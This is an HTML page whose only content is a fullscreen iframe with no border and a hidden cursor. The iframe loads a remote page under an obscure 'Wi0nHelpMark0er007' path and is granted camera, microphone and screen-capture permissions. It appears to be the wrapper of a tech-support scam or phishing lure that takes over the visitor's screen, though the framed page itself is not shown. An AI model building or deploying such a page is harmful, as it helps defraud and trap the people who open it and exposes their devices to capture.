<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Fullscreen Iframe</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  iframe {
    position: fixed;
    width: 100%;
    height: 100%;
    border: none;
    top: 0;
    left: 0;
    cursor: none;
  }
  
  /* Fullscreen ke liye */
  iframe:-webkit-full-screen {
    width: 100%;
    height: 100%;
  }
  
  iframe:fullscreen {
    width: 100%;
    height: 100%;
  }
</style>
</head>
<body>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>

<iframe 
  id="f"
  src="https://scholarhorizon-gfgkgncqeza4f3fj.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
  allowfullscreen
  webkitallowfullscreen
  mozallowfullscreen
  msallowfullscreen
  allow="fullscreen; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
</iframe>

<script>
  const iframe = document.getElementById('f');
  
  iframe.addEventListener('load', function() {
    try {
      if (iframe.contentDocument && iframe.contentDocument.documentElement) {

      }
    } catch(e) {
 
    }
  });
  
  document.addEventListener('fullscreenchange', function() {

  });
  
  document.addEventListener('webkitfullscreenchange', function() {

  });
</script>

</body>
</html>
